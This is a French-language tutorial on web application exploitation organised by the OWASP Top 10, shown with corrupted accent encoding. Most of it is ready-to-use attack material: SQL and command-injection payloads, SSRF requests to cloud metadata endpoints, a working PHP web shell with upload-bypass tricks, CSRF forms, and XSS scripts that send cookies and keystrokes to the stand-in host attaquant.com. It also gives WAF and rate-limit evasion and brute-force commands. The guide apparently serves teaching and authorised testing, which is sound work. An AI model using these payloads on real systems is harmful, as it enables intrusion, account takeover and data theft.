# Exploitation d'Applications Web

## üåê Vue d'ensemble

L'**exploitation d'applications web** est l'art de d√©couvrir et exploiter les vuln√©rabilit√©s dans les sites et applications accessibles via HTTP/HTTPS. C'est un domaine immense de la cybers√©curit√©.

> **üí° Analogie Simple** : C'est comme examiner un magasin pour trouver toutes les portes mal verrouill√©es, les fen√™tres ouvertes et les coffres-forts d√©faillants.

## ‚ö†Ô∏è **IMPORTANT - √Ä propos des exemples**

> **üéØ TOUTES les URLs, domaines, param√®tres dans ce guide sont FICTIFS !**

### üìù Exemples vs R√©alit√© :

**Dans le guide (EXEMPLE FICTIF) :**
```
http://app-test.exemple.local/login.php?id=1
vulnweb.demo.com
admin:password123
```

**Dans la vraie vie, vous devez adapter :**
```
http://[APPLICATION-CIBLE-R√âELLE]/[VRAIE-PAGE]?[VRAIS-PARAM√àTRES]
[DOMAINE-CIBLE-AUTORIS√â]
[VRAIS-IDENTIFIANTS-D√âCOUVERTS]
```

## üéØ Objectifs d'apprentissage

Apr√®s cette section, vous saurez :
1. **OWASP Top 10** - Vuln√©rabilit√©s web les plus critiques
2. **Injection SQL** - Exploiter les bases de donn√©es
3. **XSS et CSRF** - Attaques c√¥t√© client
4. **Authentication bypass** - Contourner l'authentification
5. **File upload attacks** - Exploiter l'upload de fichiers

## üîê OWASP Top 10 (2021)

### **A01:2021 - Broken Access Control**

#### **Principe de la vuln√©rabilit√©**
> **üí≠ D√©finition :** √âchec dans l'application des restrictions d'acc√®s aux utilisateurs authentifi√©s.

```
EXEMPLES CONCRETS :
‚Ä¢ Acc√®s direct aux objets par ID (IDOR)
‚Ä¢ √âl√©vation de privil√®ges
‚Ä¢ M√©tadonn√©es manipulables (JWT, cookies)
‚Ä¢ Force browsing vers pages prot√©g√©es
‚Ä¢ API sans contr√¥les d'acc√®s
```

#### **Techniques d'exploitation**

**IDOR (Insecure Direct Object Reference)**
```bash
# URL normale d'un utilisateur
http://app-test.exemple.local/profile.php?user_id=1234

# Test IDOR - changer l'ID
http://app-test.exemple.local/profile.php?user_id=1235
http://app-test.exemple.local/profile.php?user_id=1
http://app-test.exemple.local/profile.php?user_id=9999

# Encodage pour bypass
http://app-test.exemple.local/profile.php?user_id=%31%32%33%34 (URL encode)
http://app-test.exemple.local/profile.php?user_id={"id":1234}  (JSON)
```

**Parameter Pollution**
```bash
# Duplication de param√®tres
http://app-test.exemple.local/admin.php?user=guest&user=admin

# Arrays PHP
http://app-test.exemple.local/check.php?role[]=user&role[]=admin

# Techniques de bypass
http://app-test.exemple.local/api/users/1234/../../admin/config
```

### **A02:2021 - Cryptographic Failures**

#### **Stockage non s√©curis√©**
```bash
# Recherche de fichiers sensibles expos√©s
http://app-test.exemple.local/backup.sql
http://app-test.exemple.local/config.php.bak
http://app-test.exemple.local/.env
http://app-test.exemple.local/database.sqlite

# Cookies non chiffr√©s
document.cookie = "user=admin"; // Modifiable c√¥t√© client

# Transmissions non HTTPS
http://app-test.exemple.local/login.php (mots de passe en clair)
```

### **A03:2021 - Injection**

#### **SQL Injection (SQLi)**

**D√©tection de base**
```sql
-- Test de base pour erreur SQL
login.php?id=1'
login.php?id=1' OR '1'='1
login.php?id=1' OR '1'='1'--
login.php?id=1' OR '1'='1'/*

-- Time-based detection
login.php?id=1' AND SLEEP(5)--
login.php?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**Union-based SQL Injection**
```sql
-- D√©terminer le nombre de colonnes
http://app-test.exemple.local/product.php?id=1' ORDER BY 1--
http://app-test.exemple.local/product.php?id=1' ORDER BY 2--
http://app-test.exemple.local/product.php?id=1' ORDER BY 10--

-- Union SELECT
http://app-test.exemple.local/product.php?id=1' UNION SELECT 1,2,3,4--
http://app-test.exemple.local/product.php?id=1' UNION SELECT null,null,null,null--

-- Extraction de donn√©es
http://app-test.exemple.local/product.php?id=1' UNION SELECT user(),database(),version(),4--
http://app-test.exemple.local/product.php?id=1' UNION SELECT table_name,null,null,null FROM information_schema.tables--
```

**Boolean-based Blind SQLi**
```sql
-- Tests conditionnels
login.php?id=1' AND (SELECT SUBSTRING(user(),1,1)='r')--
login.php?id=1' AND (SELECT COUNT(*) FROM users)=1--
login.php?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>100--
```

#### **Command Injection**
```bash
# Tests de base
ping.php?host=127.0.0.1; id
ping.php?host=127.0.0.1 && whoami
ping.php?host=127.0.0.1 | cat /etc/passwd
ping.php?host=127.0.0.1 `id`
ping.php?host=127.0.0.1 $(whoami)

# Bypass de filtres
ping.php?host=127.0.0.1%0aid
ping.php?host=127.0.0.1%3Bid
ping.php?host=127.0.0.1%26%26id
```

### **A04:2021 - Insecure Design**

#### **Logique m√©tier d√©faillante**
```bash
# Bypass de workflow
# 1. Ajouter article au panier prix 100‚Ç¨
# 2. Appliquer code promo -50%
# 3. Modifier prix c√¥t√© client √† 1‚Ç¨
# 4. Valider commande

# Race conditions
# Transfert de 1000‚Ç¨ simultan√© vers 2 comptes
# Si pas de lock = double d√©bit
```

### **A05:2021 - Security Misconfiguration**

#### **Directory Listing et fichiers expos√©s**
```bash
# √ânum√©ration de r√©pertoires
dirb http://app-test.exemple.local/
gobuster dir -u http://app-test.exemple.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Fichiers sensibles communs
http://app-test.exemple.local/admin/
http://app-test.exemple.local/backup/
http://app-test.exemple.local/config/
http://app-test.exemple.local/db/
http://app-test.exemple.local/test/
http://app-test.exemple.local/.git/
http://app-test.exemple.local/phpinfo.php
http://app-test.exemple.local/server-status
```

### **A06:2021 - Vulnerable Components**

#### **Identification de versions**
```bash
# Headers r√©v√©lateurs
curl -I http://app-test.exemple.local/
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3

# Fingerprinting CMS
whatweb http://app-test.exemple.local/
wpscan --url http://app-test.exemple.local/ --enumerate vp

# CVE lookup
searchsploit apache 2.4.41
searchsploit php 7.4.3
```

### **A07:2021 - Authentication Failures**

#### **Attaques par force brute**
```bash
# Hydra HTTP POST
hydra -L users.txt -P passwords.txt app-test.exemple.local http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"

# Burp Suite Intruder
# 1. Capturer requ√™te de connexion
# 2. Envoyer vers Intruder
# 3. Marquer param√®tres username/password
# 4. Charger wordlists
# 5. Lancer attaque

# Bypass de limitation de tentatives
# Changer User-Agent, IP source (X-Forwarded-For)
# Reset session entre tentatives
```

#### **Session Management**
```bash
# Session fixation
# 1. Obtenir session ID avant login
# 2. Forcer victime √† utiliser cette session
# 3. Victime se connecte
# 4. Attaquant utilise la session fix√©e

# Session hijacking
# Voler cookie de session (XSS, sniffing)
# Pr√©dire session ID (faible entropie)
```

### **A08:2021 - Software Integrity Failures**

#### **Compromission de cha√Æne d'approvisionnement**
```bash
# V√©rifier int√©grit√© des CDN
# Subresource Integrity (SRI) manquant
<script src="https://cdn.exemple.com/jquery.js"></script>

# Devrait √™tre :
<script src="https://cdn.exemple.com/jquery.js" 
        integrity="sha384-HASH" 
        crossorigin="anonymous"></script>
```

### **A09:2021 - Logging Failures**

#### **Exploitation du manque de logs**
```bash
# Attaques silencieuses possibles :
‚Ä¢ Injection SQL en aveugle
‚Ä¢ Brute force lent
‚Ä¢ Exfiltration progressive
‚Ä¢ Modification de donn√©es subtile
```

### **A10:2021 - SSRF (Server-Side Request Forgery)**

#### **Techniques SSRF**
```bash
# SSRF de base
http://app-test.exemple.local/fetch.php?url=http://127.0.0.1:22
http://app-test.exemple.local/fetch.php?url=http://169.254.169.254/latest/meta-data/

# Bypass de filtres
http://app-test.exemple.local/fetch.php?url=http://localtest.me/
http://app-test.exemple.local/fetch.php?url=http://127.1/
http://app-test.exemple.local/fetch.php?url=http://[::1]/

# Cloud metadata
# AWS: http://169.254.169.254/latest/meta-data/
# Azure: http://169.254.169.254/metadata/instance?api-version=2017-04-02
# GCP: http://metadata.google.internal/computeMetadata/v1/
```

## üîß Outils d'Exploitation Web

### **Burp Suite Professional**

#### **Configuration et utilisation**
```bash
# Proxy Setup
1. Configurer navigateur proxy 127.0.0.1:8080
2. Installer certificat Burp
3. Activer interception

# Modules principaux :
‚Ä¢ Target - Cartographie de l'app
‚Ä¢ Proxy - Interception des requ√™tes
‚Ä¢ Intruder - Attaques automatis√©es
‚Ä¢ Repeater - Tests manuels
‚Ä¢ Scanner - D√©tection automatique (Pro)
‚Ä¢ Sequencer - Analyse de tokens
‚Ä¢ Decoder - Encodage/d√©codage
‚Ä¢ Comparer - Comparaison de r√©ponses
```

### **OWASP ZAP**
```bash
# Installation
apt install zaproxy

# Lancement
zaproxy

# Scan automatis√©
zap-cli quick-scan --self-contained http://app-test.exemple.local/

# API
curl "http://127.0.0.1:8080/JSON/spider/action/scan/?url=http://app-test.exemple.local/"
```

### **SQLMap**
```bash
# Tests SQLi automatiques
sqlmap -u "http://app-test.exemple.local/login.php?id=1" --dbs
sqlmap -u "http://app-test.exemple.local/login.php?id=1" -D database_name --tables
sqlmap -u "http://app-test.exemple.local/login.php?id=1" -D database_name -T users --columns
sqlmap -u "http://app-test.exemple.local/login.php?id=1" -D database_name -T users -C username,password --dump

# POST request
sqlmap -u "http://app-test.exemple.local/login.php" --data="username=admin&password=test" -p username

# Bypass WAF
sqlmap -u "http://app-test.exemple.local/login.php?id=1" --tamper=space2comment,charencode
```

### **Nikto**
```bash
# Scan de vuln√©rabilit√©s web
nikto -h http://app-test.exemple.local/
nikto -h http://app-test.exemple.local/ -C all  # Tous les checks
nikto -h http://app-test.exemple.local/ -output nikto_results.html -Format htm
```

## üíâ Techniques d'Exploitation Avanc√©es

### **Cross-Site Scripting (XSS)**

#### **XSS R√©fl√©chi**
```javascript
// Test de base
http://app-test.exemple.local/search.php?q=<script>alert('XSS')</script>

// Bypass de filtres
http://app-test.exemple.local/search.php?q=<img src=x onerror=alert('XSS')>
http://app-test.exemple.local/search.php?q=<svg onload=alert('XSS')>
http://app-test.exemple.local/search.php?q=javascript:alert('XSS')

// Payload avanc√©
http://app-test.exemple.local/search.php?q=<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('http://attaquant.com/?data='+btoa(d)))</script>
```

#### **XSS Stock√©**
```javascript
// Dans un commentaire ou profil
<script>
document.cookie = "session=" + document.cookie;
fetch('http://attaquant.com/steal.php?cookie=' + document.cookie);
</script>

// Keylogger XSS
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attaquant.com/log.php?key=' + e.key);
});
</script>
```

### **Cross-Site Request Forgery (CSRF)**
```html
<!-- CSRF pour changement de mot de passe -->
<form action="http://app-test.exemple.local/change_password.php" method="POST" style="display:none">
    <input name="new_password" value="hacked123">
    <input name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>

<!-- CSRF avec AJAX -->
<script>
fetch('http://app-test.exemple.local/admin/delete_user.php', {
    method: 'POST',
    body: 'user_id=1234',
    credentials: 'include'
});
</script>
```

### **File Upload Attacks**

#### **Upload de Web Shell**
```php
<!-- Simple PHP Web Shell -->
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form>
<input type="text" name="cmd" placeholder="Command">
<input type="submit" value="Execute">
</form>

<!-- Techniques de bypass -->
# Extension double
shell.php.jpg

# Null byte (anciennes versions PHP)
shell.php%00.jpg

# Majuscules
shell.PHP

# MIME type spoofing
# Modifier Content-Type: image/jpeg
```

#### **Path Traversal**
```bash
# Upload avec path traversal
filename="../../../var/www/html/shell.php"
filename="..\\..\\..\\xampp\\htdocs\\shell.php"

# Bypass de filtres
filename="....//....//....//var/www/html/shell.php"
filename="..%2f..%2f..%2fvar/www/html/shell.php"
```

## üõ°Ô∏è Contournement de Protections

### **WAF Bypass**

#### **Techniques g√©n√©rales**
```bash
# Encodage
%3Cscript%3E (URL encoding)
&#x3C;script&#x3E; (HTML entities)
\u003cscript\u003e (Unicode)

# Fragmentation
<scr<script>ipt>alert(1)</script>

# Commentaires
/**/UNION/**/SELECT/**/

# Variations de casse
UnIoN sElEcT

# Caract√®res alternatifs
select(username)from(users)where(id=1)
```

### **Rate Limiting Bypass**
```bash
# Headers √† essayer
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
Client-IP: 1.2.3.4

# Rotation User-Agent
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
```

## üìã Checklist d'Exploitation Web

### **Reconnaissance**
```bash
‚òê Fingerprinting technologique (whatweb, wappalyzer)
‚òê √ânum√©ration de r√©pertoires (dirb, gobuster)
‚òê Identification des param√®tres d'entr√©e
‚òê Cartographie de l'application (spider, crawl)
‚òê Recherche de fichiers sensibles
‚òê Analyse des cookies et sessions
‚òê Test des m√©thodes HTTP (OPTIONS, PUT, DELETE)
‚òê Recherche de sous-domaines
```

### **Tests d'injection**
```bash
‚òê SQL Injection (GET, POST, Headers, Cookies)
‚òê Command Injection
‚òê LDAP Injection
‚òê XPath Injection
‚òê NoSQL Injection
‚òê Template Injection
‚òê XXE (XML External Entities)
‚òê SSTI (Server-Side Template Injection)
```

### **Tests d'authentification**
```bash
‚òê Brute force login
‚òê Default credentials
‚òê Password reset flaws
‚òê Session management
‚òê Multi-factor bypass
‚òê JWT token issues
‚òê OAuth flaws
‚òê Remember me vulnerabilities
```

### **Tests c√¥t√© client**
```bash
‚òê XSS (Reflected, Stored, DOM)
‚òê CSRF
‚òê Clickjacking
‚òê HTML5 security
‚òê Client-side validation bypass
‚òê Browser cache poisoning
‚òê CORS misconfiguration
‚òê Content Security Policy bypass
```

## üéØ Ressources et R√©f√©rences

### **Laboratoires de pratique**
- **DVWA** : Damn Vulnerable Web Application
- **WebGoat** : OWASP WebGoat
- **bWAPP** : buggy Web Application
- **Mutillidae** : OWASP Mutillidae II
- **VulnHub** : Machines virtuelles vuln√©rables
- **HackTheBox** : Plateforme en ligne

### **Outils essentiels**
- **Burp Suite** : Proxy et scanner web
- **OWASP ZAP** : Alternative gratuite √† Burp
- **SQLMap** : Exploitation SQL injection
- **Nikto** : Scanner de vuln√©rabilit√©s
- **DirBuster/Gobuster** : √ânum√©ration de r√©pertoires

### **R√©f√©rences**
- **OWASP Top 10** : https://owasp.org/Top10/
- **OWASP Testing Guide** : https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Academy** : https://portswigger.net/web-security
- **HackerOne Hacktivity** : https://hackerone.com/hacktivity

---
*L'exploitation web est un art qui demande cr√©ativit√© et pers√©v√©rance. Chaque application est unique !* 